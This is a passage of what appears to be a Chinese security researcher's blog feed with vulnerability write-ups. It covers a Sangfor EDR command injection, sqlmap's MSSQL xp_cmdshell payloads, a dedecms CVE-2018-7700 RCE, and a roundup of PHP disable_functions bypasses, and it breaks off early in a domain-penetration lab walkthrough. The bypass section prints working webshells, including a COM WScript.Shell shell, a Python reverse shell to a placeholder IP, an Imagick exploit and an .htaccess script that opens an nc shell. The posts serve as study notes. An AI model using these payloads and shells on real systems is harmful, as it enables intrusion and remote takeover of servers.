    ldb_debug(&quot;exec command: &quot;.$command);
    ldb_exec($command, $output, $ret);
    if ($ret !== 0) {
        ldb_error(&quot;exec slog action fail, command: $command, error: &quot;.$output);
        $object-&gt;err_code = EXEC_SLOG_ACTION_FAILED;
        return -1;
    }

    $data = $output;
    response_linkage_dev_msg(SUCCESS,$data);
    return 0;
};
</code></pre>
<p>这里的代码逻辑是先要去 shell_argv_transform 过滤一下，其实就是 escapeshellarg。先去查了一下绕过的文章，看了2分钟云里雾里，直接上手。发现其实就是添加单引号，但是 || 可以逃逸<br>
那么最终的报文就如此简单</p>
<pre><code class="language-http">POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwibWQ1IjoiYzRjYTQyMzhhMGI5MjM4MjBkY2M1MDlhNmY3NTg0OWIifQ== HTTP/1.1
Host: 192.168.244.199
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 52
Content-Type: application/json;charset=UTF-8

{
	&quot;opr&quot;:&quot;exec_slog_action&quot;,
	&quot;params&quot;:&quot; ||whoami&quot;
}
</code></pre>
<p>截图如下<br>
<img src="https://chriskalix.github.io/post-images/1598579017876.png" alt="" loading="lazy"></p>
<p>后来key仔跟说我opr其实不用赋值的，我看了看逻辑好像是这样滴...<br>
为什么会有这样的问题？这应该本身只是一个正常的ping功能，开发认为用了 <code>escapeshellarg</code> 就可以规避注入的问题，实际上 || 就逃逸出来了</p>
<h1 id="整理">整理</h1>
<h2 id="危险函数">危险函数</h2>
<p>ldb_exec<br>
ldb_mklink</p>
<h2 id="危险点跟踪">危险点跟踪</h2>
<h3 id="webbatch_pushbatch_cmdphp">/web/batch_push/batch_cmd.php</h3>
<p>追溯后没有直接调用</p>
<h3 id="webreport_centerreport_centerphp">/web/report_center/report_center.php</h3>
<p>比对失败</p>
<h3 id="linkage_managephp">linkage_manage.php</h3>
<p>失败</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[老生常谈之Mssql注入]]></title>
        <id>https://chriskalix.github.io/post/O9BI689Eo/</id>
        <link href="https://chriskalix.github.io/post/O9BI689Eo/">
        </link>
        <updated>2020-08-15T14:47:12.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>注入，老话题了。但是实战中碰到时往往草草带过，稍一深入就要露馅了，基本功不扎实不行，趁热打铁，立刻补上</p>
</blockquote>
<h2 id="环境">环境</h2>
<blockquote>
<p>环境的安装是比较头疼的，也没啥好说的，直接搜索搭建就完事了</p>
</blockquote>
<p>sqlserver 2014<br>
win10<br>
php5.2.17</p>
<h2 id="sqlmap行为分析">SQLmap行为分析</h2>
<blockquote>
<p>这里使用的方法是sqlmap，然后流量代理至本地burpsuite进行流量分析</p>
</blockquote>
<h3 id="普通判断">普通判断</h3>
<p>首先，SQLmap会预先判断数据库，当判断完毕后，需要选择<br>
<img src="https://chriskalix.github.io/post-images/1597507430917.png" alt="" loading="lazy"><br>
这时候看一下sqlmap发了什么数据。首先总共发送了6个数据包，因为之前预先读过一小部分的sqlmap源码，但是由于实在是太大（我太懒），所以用半猜测半推断的方式进行分析<br>
<img src="https://chriskalix.github.io/post-images/1597507581479.png" alt="" loading="lazy"><br>
首先会发送一个预先判断的数据包，应该是判断是否存在WAF<br>
<img src="https://chriskalix.github.io/post-images/1597507626390.png" alt="" loading="lazy"><br>
之后通过两个数据包，猜测通过判断返回包的关键字判断了为mssql，之后的数据包太多了，我还是口述一下。默认的technique是全部的BEUSTQ，在尝试了所有注入类型后，Sqlmap给出结果。<br>
<img src="https://chriskalix.github.io/post-images/1597507917353.png" alt="" loading="lazy"><br>
即报错型，时间布尔型，堆叠注入都可以</p>
<h3 id="关键的os-shell">关键的OS-shell</h3>
<blockquote>
<p>SQLmap中Os-shell的方式，之前在mysql中已经做过了解。先知中的<a href="https://xz.aliyun.com/t/7942">这篇文章</a>没有提到sqlserver怎么从注入点os-shell的，一时尴尬的我不知如何是好...</p>
</blockquote>
<p>首先，先发了4个包，剔除探活的就是3个<br>
<img src="https://chriskalix.github.io/post-images/1597508231666.png" alt="" loading="lazy"><br>
前面两个应该为报错型的数据，所以直接看最后的一个数据包<br>
<img src="https://chriskalix.github.io/post-images/1597508739304.png" alt="" loading="lazy"><br>
在返回中提示了xp_cmdshell插件没有开启，同时sqlmap也提示是否要重新启用该组件，之后的payload为如下所示，共有四个（剔除了校验xp_cmdshell是否开启的数据包）<br>
包1，尝试直接开启xp_cmdshell，失败（语法错误</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE-- HTTP/1.1
</code></pre>
<p>包2，把xp_cmdshell关了</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',0; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>包3，启用<code>ole automation procedures</code>，语法错误</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'ole automation procedures',1; RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>包4，用sp_OACreate创建xp_cmdshell</p>
<pre><code>test');DECLARE @hpzy nvarchar(999); SET @hpzy='CREATE PROCEDURE new_xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int EXEC sp_OACreate ''WScript.Shell'',@ID OUT EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 EXEC sp_OADestroy @ID'; EXEC master..sp_executesql @hpzy;RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>上面一顿操作后，os-shell的结果是失败的（使用的是Error-based注入，那么time-based是否不一样呢？答：其实也是用xp_cmdshell，只是time-based建立了一个临时表，然后把xp_cmdshell的结果写道临时表里面，再读取出来。为什么出错了呢？猜测因为代码写的是query。<br>
这里刚开始看的时候比较好奇，都已经sp_OAcreate了，为什么不直接执行命令就行了呢？后来发现这样执行其实是没有回显的......</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[dedecms老洞分析之 - CVE-2018-7700]]></title>
        <id>https://chriskalix.github.io/post/8IizO54vS/</id>
        <link href="https://chriskalix.github.io/post/8IizO54vS/">
        </link>
        <updated>2020-08-14T07:47:33.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>dedecms是比较经典的cms。当我第一次打开它的源码的时候我有点震惊(一个目录下好多PHP<br>
<img src="https://chriskalix.github.io/post-images/1597391332229.png" alt="" loading="lazy"></p>
</blockquote>
<p>回归正题，下面开始分析</p>
<h2 id="代码层面漏洞分析">代码层面漏洞分析</h2>
<blockquote>
<p>该漏洞为后台RCE，所以先登录后台进行后续操作</p>
</blockquote>
<h2 id="漏洞入口点">漏洞入口点</h2>
<p>入口点在 <code>tag_test_action.php</code> 函数中</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1597391385755.png" alt="" loading="lazy"></figure>
<p>这里有个预判断，就是 <code>csrf_check()</code> ，跟进这个函数，在 <code>config.php</code></p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1597391393119.png" alt="" loading="lazy"></figure>
<p>global <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">直</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">从</mi></mrow><annotation encoding="application/x-tex">token是直接从</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">从</span></span></span></span>GLOBALS里面取值，那么只要传递token参数即可。因为<code>$_SESSION['token']</code>是不存在的，为NULL，即只要传入 <code>?token=</code> 即可绕过该判断</p>
<h2 id="漏洞长链">漏洞长链</h2>
<p>绕过之后继续跟进tag_test_action.php，new了一个对象，所以预先调用 <code>__construct</code></p>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1597391398578.png" alt="" loading="lazy"></figure>
<p>走到<code>setTemplet</code> 函数跟进（在<code>arc.partview.class</code>中</p>
<figure data-type="image" tabindex="4"><img src="https://chriskalix.github.io/post-images/1597391404105.png" alt="" loading="lazy"></figure>
<p>所以 <code>$this-&gt;dtp-&gt;LoadSource()</code> 即调用 <code>DedeTagParse</code> 里的 <code>LoadSource</code> 方法</p>
<figure data-type="image" tabindex="5"><img src="https://chriskalix.github.io/post-images/1597391408624.png" alt="" loading="lazy"></figure>
<p>文件写入后调用 <code>LoadTemplate</code> 方法，继续跟进</p>
<figure data-type="image" tabindex="6"><img src="https://chriskalix.github.io/post-images/1597391412119.png" alt="" loading="lazy"></figure>
<p>跟进else，while部分为文件读取，跟进下面部分的 <code>LoadCache</code>， 截取部分关键</p>
<figure data-type="image" tabindex="7"><img src="https://chriskalix.github.io/post-images/1597391416214.png" alt="" loading="lazy"></figure>
<p>最后回到起初的<code>tag_test_action.php</code>，调用 <code>Display()</code>，继续跟进display</p>
<figure data-type="image" tabindex="8"><img src="https://chriskalix.github.io/post-images/1597391420423.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://chriskalix.github.io/post-images/1597391425587.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://chriskalix.github.io/post-images/1597391429782.png" alt="" loading="lazy"></figure>
<p>调用AssignSysTag()，继续跟进，剔除前面读取和循环部分</p>
<figure data-type="image" tabindex="11"><img src="https://chriskalix.github.io/post-images/1597391437221.png" alt="" loading="lazy"></figure>
<h2 id="漏洞触发点">漏洞触发点</h2>
<p>跟到最后执行函数的RunPHP，很经典的一个<code>@eval</code></p>
<figure data-type="image" tabindex="12"><img src="https://chriskalix.github.io/post-images/1597391441512.png" alt="" loading="lazy"></figure>
<h2 id="整体逻辑图">整体逻辑图</h2>
<figure data-type="image" tabindex="13"><img src="https://chriskalix.github.io/post-images/1597391448530.jpg" alt="" loading="lazy"></figure>
<h2 id="exp">EXP</h2>
<p>先知上给的EXP是<br>
<a href="http://localhost/%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80/tag_test_action.php?url=a&amp;token=&amp;partcode=%7Bdede:field">url=a&amp;token=&amp;partcode={dede:field</a> name='source' runphp='yes'}phpinfo();{/dede:field}，<br>
但是跟下来没发现用到url参数，其实不用也可以。</p>
<p>跟图中标记的一样，<code>token=</code>，其中partcode要符合dedecms的模板风格，即{dede:file}{/dede:field}，为了走入Runphp分支，要添加runphp='yes'；所以分析完毕后，参数就比作者简单一点<br>
<code>?token=&amp;partcode{dede:filed runphp='yes'}system(whoami);{/dede:field}</code> 即可</p>
<p>结果如下</p>
<figure data-type="image" tabindex="14"><img src="https://chriskalix.github.io/post-images/1597391454531.png" alt="" loading="lazy"></figure>
<h1 id="后续思考">后续思考</h1>
<p>没挖过dedecms的漏洞，但是针对这种类型的cms，猜测挖掘者的手法可能为2种。</p>
<ol>
<li>从危险函数eval作为触发点进行回溯。其实在很多的cms中也会有这种问题，就是用在模板渲染中使用eval执行代码，在我审计过的为数不多的cms中，大概有3个都是这种类型触发的。</li>
<li>从功能出发，这个其实就是后台的模板功能，跟上面所述，模板渲染等功能是高发区（RCE高发区）。不过前台用户一般没有权限更改，只有后台用户可以，所以一般情况下，都是后台RCE居多</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[disable_functions bypass整理]]></title>
        <id>https://chriskalix.github.io/post/GqcqeDkXU/</id>
        <link href="https://chriskalix.github.io/post/GqcqeDkXU/">
        </link>
        <updated>2020-07-26T10:22:04.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运</p>
</blockquote>
<h2 id="环境">环境</h2>
<p>phpstudy<br>
php 7.1.9</p>
<p>开始前需要手动添加<code>disable_functions</code>，我配置的为 <code>exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</code></p>
<h2 id="绕过整理">绕过整理</h2>
<h3 id="0x01-windows-系统组件">0x01 Windows - 系统组件</h3>
<blockquote>
<p>适用于Windows下，使用前需要查看COM组件是否开启。windows下5.X默认支持</p>
</blockquote>
<p>在 <code>php.ini</code> 中找到 <code>extension=php_com_dotnet.dll</code> 并且开启（若没有则直接添加），结果如下<br>
<img src="https://chriskalix.github.io/post-images/1595758966523.png" alt="" loading="lazy"></p>
<p>对于com组件仅简单了解，不做搬运文章的苦力，<a href="https://www.zhihu.com/question/49433640">文章地址</a>。从百度百科抄一句：COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。<br>
通过COM组件，调用WScript.shell（这个在写VBS的时候经常用到）或者shell.application执行系统命令。从安全客上搬运的代码如下：</p>
<pre><code class="language-php">&lt;?php
$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
if($wsh == 'wscript') {
    $command = $_GET['cmd'];
    $wshit = new COM('WScript.shell') or die(&quot;Create Wscript.Shell Failed!&quot;);
    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);
    $stdout = $exec-&gt;StdOut();
    $stroutput = $stdout-&gt;ReadAll();
    echo $stroutput;
}
elseif($wsh == 'application') {
    $command = $_GET['cmd'];
    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);
    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);
} 
else {
  echo(0);
}
?&gt;
</code></pre>
<p>执行效果如下</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1595758973366.png" alt="" loading="lazy"></figure>
<h3 id="0x02-linux-ld_preload">0x02 Linux - LD_PRELOAD</h3>
<blockquote>
<p>条件：1. 能上传.so文件 2. putenv能使用，控制环境变量 3. mail, imap_mail, mb_send_mail, error_log等函数能够调用</p>
</blockquote>
<p>相比起来，这个稍微熟悉一点。之前在写Linux下应急响应脚本的时候，就包含LD_PRELOAD的检验。LD_PRELOAD是linux下的预加载环境变量，可以通过导入恶意的.so文件替换环境变量，从而劫持函数。在安全客上有一篇<a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD&amp;putenv()</a>。为什么要使用mail之类的函数？因为在设置环境变量后，仅会在请求期间存在，想要使预环境变量被加载，就要找到创建子进程的函数，从而触发恶意.so文件。同样的摸到了仓库<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">github - LD_PRELOAD</a>，讲的也很好，在理解的情况下做一点搬运<br>
通常情况下，大部分文章使用LD_PRELOAD的方法为如下几步：</p>
<ol>
<li>编写一个getuid的C函数（为什么是getuid，因为sendmail会用到），编译成xx.so</li>
<li>运行phpenv，设置LD_PRELOAD为xx.so</li>
<li>运行mail函数，由于设置了LD_PRELOAD，会优先从xx.so中寻找函数</li>
<li>执行恶意命令</li>
</ol>
<p>但是在实战用会碰到一系列问题，如禁止sendmail，服务器上根本没有安装sendmail。仓库中提到，不要局限于劫持某一个函数，而应考虑<strong>拦截启动进程</strong>。在GCC中有一个C语言的拓展修饰符， <code>__attribute__((constructor))</code> ，可以让由它修饰的函数在<code>main()</code> 函数之前运行。当出现在共享对象中，一旦对象被系统加载，则立即执行由它所修饰的函数。而当启动新进程的时候，又会自动调用该函数，会造成循环阻塞。这里需要注意的是，由于需要调用 <code>unsetenv()</code> ，在centos下是不可行的（具体原因看仓库）。<br>
在知道原理后直接使用作者的仓库进行尝试：<br>
<img src="https://chriskalix.github.io/post-images/1595758980470.png" alt="" loading="lazy"></p>
<p>这里作者提到一个问题，如果目标开启SELinux会导致对outpath没有读写权限，以及.so文件是在debian系统下编译，对于非debian系统需要重新编译。</p>
<h3 id="0x03-linux-pcntl_exec">0x03 Linux - pcntl_exec</h3>
<blockquote>
<p>这个也很早了，文章很多，主要是做个记录</p>
</blockquote>
<p>该函数在PHP&gt;4.2.0，5，7中存在。搬运一个python的版本，可以自行修改</p>
<pre><code class="language-php">&lt;?php
pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
</code></pre>
<h3 id="0x04-imagick">0x04 imagick</h3>
<blockquote>
<p>这个每个文章里基本都有，做个记录吧</p>
</blockquote>
<p>还是一样，先在 <code>phpinfo</code> 中先看下是否有该组件。这个在看H1文章会看到，属于组件问题。直接搬运一下RicterZ师傅的代码，url自行更改（不过感觉现在基本没了吧...）</p>
<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
# Test on: Ubuntu 12.04
 
# Exploit:
 
&lt;?php
# PHP Imagick disable_functions Bypass
# Author: Ricter &lt;ricter@chaitin.com&gt;
#
# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
# &lt;pre&gt;
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# &lt;/pre&gt;
echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo &quot;Run command: $command\n====================\n&quot;;
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
pop graphic-context
EOF;
 
file_put_contents(&quot;$imagick_file&quot;, $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage(&quot;$imagick_file&quot;);
$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
$thumb-&gt;clear();
$thumb-&gt;destroy();
 
echo file_get_contents($data_file);
?&gt;
</code></pre>
<h3 id="0x05-htaccess">0x05 .htaccess</h3>
<blockquote>
<p>.htaccess，做配置的时候老见到了，也有用来做后门隐藏的，总之用法很多</p>
</blockquote>
<p>（搬运一下）有如下条件：</p>
<ol>
<li>必须是apache</li>
<li>mod_cgi</li>
<li>运行.htaccess生效</li>
<li>有写.htaccess的权限</li>
</ol>
<pre><code class="language-php">&lt;?php
$cmd = &quot;nc -c'/bin/bash' 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET['checked']))
{
    @file_put_contents('.htaccess',&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
}
else
{
    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable('.'); //检测当前目录是否可写
    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
    }
    else
    {
       
 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess
        
checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents('.htaccess',&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
        echo &quot;Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;&quot;; //调用
    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5320#toc-0">先知文章</a><br>
<a href="https://baijiahao.baidu.com/s?id=1659386031704746677&amp;wfr=spider&amp;for=pc">E安全</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透整理复现]]></title>
        <id>https://chriskalix.github.io/post/2cLB43Y5A/</id>
        <link href="https://chriskalix.github.io/post/2cLB43Y5A/">
        </link>
        <updated>2020-07-19T13:19:54.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>不知道为什么用这个传不了PDF，就放一个Github链接吧~</p>
</blockquote>
<p><a href="https://github.com/chriskaliX/AD_pentest_Notes">Github项目地址</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透靶机实战(一)]]></title>
        <id>https://chriskalix.github.io/post/-iDU1AvVp/</id>
        <link href="https://chriskalix.github.io/post/-iDU1AvVp/">
        </link>
        <updated>2020-07-01T02:27:34.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>标题是（一），其实是红日的靶机2，前段时间学习了域的基础后最近开始做靶机，逐步提升吧，希望有不足的地方大家能帮我指出，谢谢</p>
</blockquote>
<h2 id="0x01-环境配置">0x01 环境配置</h2>
<h3 id="1-环境搭建">1. 环境搭建</h3>
<p>从<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">这里</a>下载靶机环境，配置两个hostonly网卡分别为10.10.10.0/24，以及192.168.111.1/24网段</p>
<h3 id="2-环境一览">2. 环境一览</h3>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">内网地址</th>
<th style="text-align:center">外网地址</th>
<th style="text-align:center">系统</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">DC</td>
<td style="text-align:center">10.10.10.10.</td>
<td style="text-align:center"></td>
<td style="text-align:center">Windows 2012(64位)</td>
</tr>
<tr>
<td style="text-align:center">WEB</td>
<td style="text-align:center">10.10.10.80</td>
<td style="text-align:center">192.168.111.80</td>
<td style="text-align:center">Windows 2008(64位)</td>
</tr>
<tr>
<td style="text-align:center">PC</td>
<td style="text-align:center">10.10.10.201</td>
<td style="text-align:center">192.168.111.201</td>
<td style="text-align:center">Windows 7(32位)</td>
</tr>
<tr>
<td style="text-align:center">Kali(自建)</td>
<td style="text-align:center"></td>
<td style="text-align:center">192.168.111.x</td>
<td style="text-align:center">Kali Linux 2020.2</td>
</tr>
</tbody>
</table>
<p>[*] 注：在主机 <code>WEB</code> 起来后，要手动起 <code>Weblogic</code> 服务</p>
<h2 id="0x02-实战开始">0x02 实战开始</h2>
<blockquote>
<p>在做的时候要当成黑盒，这样做起来比较有逻辑</p>
</blockquote>
<h3 id="1-外部突破">1. 外部突破</h3>
<h4 id="常规扫描">常规扫描</h4>
<p><code>nmap 192.168.111.1/24 -sS -p 1-65535 -T4</code> 对C段下进行初步发现，扫描结果如下：</p>
<pre><code>Nmap scan report for 192.168.111.80
Host is up (0.0014s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49183/tcp open  unknown
49190/tcp open  unknown
60966/tcp open  unknown
MAC Address: 00:0C:29:91:56:77 (VMware)

Nmap scan report for 192.168.111.201
Host is up (0.0080s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 00:0C:29:32:32:CD (VMware)
</code></pre>
<p>其中80机器对外开放80端口，觉得比较有可能为入口点。使用dirsearch扫描目录，无果。其余开放的1433，3389，445等常规端口，可以尝试口令、或者CVE直接打一下试试。<br>
这时访问7001端口，发现为web应用。想起了熟悉的weblogic，于是用dirsearch再遍历一下，发现/console目录，访问。<br>
<img src="https://chriskalix.github.io/post-images/1594016543093.png" alt="" loading="lazy"><br>
果然是weblogic，版本为10.3.6.0</p>
<h4 id="权限获取">权限获取</h4>
<p>这里用 <code>rabbitmask</code> 师傅的 <code>weblogicscan</code> 扫一发。存在<code>cve-2019-2725</code>以及<code>cve-2019-2727</code>。我就直接用 <code>msf</code> 上的cve-2019-2725试了一下，得到了初步权限<br>
这里还是比较简单的<br>
<img src="https://chriskalix.github.io/post-images/1594016548948.png" alt="" loading="lazy"></p>
<h3 id="2-本机信息获取">2. 本机信息获取</h3>
<blockquote>
<p>亮神：渗透测试的本质就是信息收集</p>
</blockquote>
<p><code>shell</code>进入靶机，输入 <code>chcp 65001</code> 修改乱码显示。整理后信息如下，其实信息获取还不够完善，例如防火墙策略等等，可以参考腾讯蓝军的文章：</p>
<table>
<thead>
<tr>
<th style="text-align:center">信息</th>
<th style="text-align:center">详情</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">主机名</td>
<td style="text-align:center">WEB</td>
</tr>
<tr>
<td style="text-align:center">主机版本</td>
<td style="text-align:center">Windows Server 2008 R2</td>
</tr>
<tr>
<td style="text-align:center">域名称</td>
<td style="text-align:center">de1ay.com</td>
</tr>
<tr>
<td style="text-align:center">内网IP</td>
<td style="text-align:center">10.10.10.80</td>
</tr>
<tr>
<td style="text-align:center">防护软件</td>
<td style="text-align:center">360</td>
</tr>
<tr>
<td style="text-align:center">权限</td>
<td style="text-align:center">Administrator</td>
</tr>
</tbody>
</table>
<p>执行<code>net time /domain</code> 报错5，代表有域，但是当前不是域用户</p>
<h4 id="端口开放">端口开放</h4>
<pre><code>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1472
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       400
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       784
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49183          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49190          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:60966          0.0.0.0:0              LISTENING       1472
  TCP    10.10.10.80:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.80:7001       0.0.0.0:0              LISTENING       3264
  TCP    127.0.0.1:7001         0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.111.80:7001    0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:49399   192.168.111.128:4444   ESTABLISHED     1088
</code></pre>
<h4 id="进程信息">进程信息</h4>
<p><img src="https://chriskalix.github.io/post-images/1594016561684.png" alt="" loading="lazy"><br>
主机上运行着360</p>
<h3 id="3-权限提升">3. 权限提升</h3>
<blockquote>
<p>这里看的也少，有基础的知识点没有覆盖，于是摘抄一些作为记录</p>
</blockquote>
<h4 id="windows提权方法">windows提权方法</h4>
